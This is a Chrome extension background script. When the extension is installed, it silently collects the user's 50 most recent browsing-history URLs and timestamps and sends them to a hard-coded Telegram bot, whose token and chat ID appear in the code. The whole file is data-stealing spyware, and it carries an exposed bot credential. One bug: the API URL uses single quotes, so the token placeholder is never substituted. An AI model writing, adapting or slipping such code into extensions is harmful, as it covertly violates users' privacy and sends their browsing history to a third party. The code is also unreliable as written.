chrome.runtime.onInstalled.addListener(function() {
  chrome.history.search({ text: '', maxResults: 50 }, function(data) {
    const searchHistory = data.map(entry => {
      const searchDate = new Date(entry.lastVisitTime);
      const formattedDate = `${searchDate.toLocaleDateString()} ${searchDate.toLocaleTimeString()}`;
      return `${formattedDate} - ${entry.url}`;
    }).join('\n');
    sendToTelegram(searchHistory);
  });
});

function sendToTelegram(data) {
  const botToken = '6534682438:AAGfB2r2FBheRRikT9WBCCi53g00wFrJNYk'; // Replace with your Telegram bot token
  const chatId = '6314288047'; // Replace with your Telegram chat ID
  const apiUrl = 'https://api.telegram.org/bot${botToken}/sendMessage';

  const payload = {
    chat_id: chatId,
    text: data,
  };

  fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  })
  .then(response => response.json())
  .then(data => console.log('Data sent to Telegram:', data))
  .catch(error => console.error('Error sending data:', error));
}
